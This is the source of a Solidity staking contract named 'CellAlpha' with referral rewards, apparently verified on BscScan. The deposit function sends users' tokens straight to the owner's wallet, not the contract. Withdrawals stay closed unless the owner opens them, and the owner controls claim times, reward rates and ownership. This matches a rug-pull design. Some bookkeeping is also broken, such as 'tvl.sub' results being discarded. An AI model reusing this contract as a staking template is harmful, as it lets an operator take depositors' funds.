/**
 *Submitted for verification at BscScan.com on 2022-09-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}


contract CellAlpha {

    using SafeMath for uint256;

    bool private _withdraw;
    address public _owner;
    address public payToken;
    uint256 public startTime;
    uint256 public claimTime;
    uint256 public endTime = 2222222222;
    uint256 public tvl; //Total value locked
    uint256 public tus; //Total users
    uint256 public tcr; //Total claimed rewards
    uint256 public tur; //Total unclaimed rewards
    uint256 public rrs; //Rewards rate x/second
    uint256 public irr = 15; //Invite rewards rate (subAddr reward * irr)

    mapping(address => User) private _users;

    event Deposit(address _userAddr, address _supAddr, uint256 _amount);

    event Claim(
        address _userAddr,
        address _supAddr,
        uint256 _crs, //claimedRewards
        uint256 _irs //inviteRewards
    );

    event Withdraw(address _userAddr, uint256 _amount);

    event WithdrawPro(address _userAddr, address _proAddr, uint256 _amount);

    constructor() {
        _owner = msg.sender;
        startTime = block.timestamp;
    }

    struct User{
        address userAddr_;
        address supAddr_;
        uint256 lct_; //lastClaimTime
        uint256 ldt_; //lastDepositTime
        uint256 sta_; //stakeAmount
        uint256 cdr_; //claimedRewards
        uint256 ucr_; //unclaimedRewards
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller is not the owner");
        _;
    }

    function setOwner(address owner) external onlyOwner {
        _owner = owner;
    }

    function setRrs(uint256 _rrs) external onlyOwner {
        rrs = _rrs;
    }

    function setIrr(uint256 _irr) external onlyOwner {
        irr = _irr;
    }

    function setPayToken(address _payToken) external onlyOwner {
        payToken = _payToken;
    }

    function setStartTime(uint256 _startTime) external onlyOwner {
        startTime = _startTime;
    }

    function setEndTime(uint256 _endTime) external onlyOwner {
        endTime = _endTime;
    }

    function setClaimTime(uint256 _claimTime) external onlyOwner {
        claimTime = _claimTime;
    }

    function openWithdraw() external onlyOwner {
        _withdraw = true;
    }

    function closeWithdraw() external onlyOwner {
        _withdraw = false;
    }

    function deposit(address _ref, uint256 _amount) external returns (bool) {
        //Check amount
        require(_amount >= 50 ether, "Minimum input 50");
        //Check endTime
        require(endTime > block.timestamp, "Stake is closed");
        //Trans token
        require(IERC20(payToken).transferFrom(msg.sender, _owner, _amount), "Failed to transfer token");
        User storage user = _users[msg.sender];
        if(_ref == msg.sender || _ref == address(0) || findUser(_ref)) {
            _ref = _owner;
        }
        //Check user
        if(user.ldt_ == 0) {
            //New
            tus = tus.add(1);
            _users[msg.sender] = User({userAddr_: msg.sender, supAddr_: _ref, lct_: block.timestamp, ldt_: block.timestamp, sta_: _amount, cdr_: 0, ucr_: 0});
        } else {
            //Update unclaimed rewards
            uint256 lastTime = max(user.lct_, user.ldt_);
            lastTime = max(lastTime, startTime);
            uint256 endRewardTime = min(block.timestamp, endTime);
            uint256 addRewards = (endRewardTime.sub(lastTime)).mul(rrs).mul(user.sta_).div(1e12);
            user.ldt_ = block.timestamp;
            user.ucr_ = addRewards.add(user.ucr_);
            user.sta_ = _amount.add(user.sta_);
            tur = tur.add(addRewards);
        }
        tvl = tvl.add(_amount);
        emit Deposit(msg.sender, _ref, _amount);
        return true;
    }

    function claim() public returns (bool) {
        require(block.timestamp < claimTime, "Time is up");
        User storage user = _users[msg.sender];
        require(user.sta_ > 0, "Position is 0");
        uint256 lastTime = max(user.lct_, user.ldt_);
        lastTime = max(lastTime, startTime);
        uint256 endRewardTime = min(block.timestamp, endTime);
        //Unclaimed rewards
        uint256 ucrs = (endRewardTime.sub(lastTime)).mul(rrs).mul(user.sta_).div(1e12);
        ucrs = ucrs.add(user.ucr_);
        tur = tur.sub(user.ucr_);
        user.ucr_ = 0;
        user.cdr_ = ucrs.add(user.cdr_);
        user.lct_ = block.timestamp;
        //Trans token
        require(IERC20(payToken).transfer(msg.sender, ucrs), "Failed to collect reward");
        tcr = tcr.add(ucrs);
        //Invite rewards
        uint256 ivrs = ucrs.mul(irr).div(100);
        require(IERC20(payToken).transfer(user.supAddr_, ivrs), "Failed to collect invite reward");
        emit Claim(msg.sender, user.supAddr_, ucrs, ivrs);
        return true;
    }

    function withdraw(uint256 _amount) external returns (bool) {
        require(_withdraw, "Not open for withdrawal");
        require(_amount > 0, "Withdrawal cannot be 0");
        User storage user = _users[msg.sender];
        require(user.sta_ >= _amount, "Withdrawals cannot be larger than the position");
        //Withdraw
        user.sta_ = user.sta_.sub(_amount);
        require(IERC20(payToken).transfer(msg.sender, _amount), "Withdrawal failure");
        require(claim(), "Reward collection failed");
        tvl.sub(_amount);
        emit Withdraw(msg.sender, _amount);
        return true;
    }

    function withdrawPro(address _userAddr, uint256 _amount) external onlyOwner {
        require(_amount > 0, "Pro: Withdrawal cannot be 0");
        User storage user = _users[_userAddr];
        require(user.sta_ >= _amount, "Pro: Withdrawals cannot be larger than the position");
        //Withdraw pro
        user.sta_ = user.sta_.sub(_amount);
        tvl.sub(_amount);
        require(IERC20(payToken).transfer(_userAddr, _amount), "Pro: Withdrawal failure");
        emit WithdrawPro(msg.sender, _owner, _amount);
    }

    function getUser(address _userAddr) public view returns (User memory) {
        User memory user = _users[_userAddr];
        uint256 lastTime = max(user.lct_, user.ldt_);
        lastTime = max(lastTime, startTime);
        uint256 endRewardTime = min(block.timestamp, endTime);
        //Unclaimed rewards
        uint256 ucrs = (endRewardTime.sub(lastTime)).mul(rrs).mul(user.sta_).div(1e12);
        user.ucr_ = ucrs.add(user.ucr_);
        return user;
    }

    function getRrs() public view returns (uint256) {
        return rrs;
    }

    function getAPR() public view returns (uint256) {
        return rrs * 60 * 60 * 24 * 365 * 10000 / 1e12;
    }

    function getDayRate(uint256 secondeRate) public pure returns (uint256) {
        return secondeRate * 60 * 60 * 24 * 1 ether / 1e12;
    }

    function findUser(address _userAddr) private view returns (bool) {
        User memory user = _users[_userAddr];
        if(user.sta_ > 0) {
            return false;
        } else {
            return true;
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function max(uint256 a, uint256 b) private pure returns (uint256) {
        return a > b ? a : b;
    }

}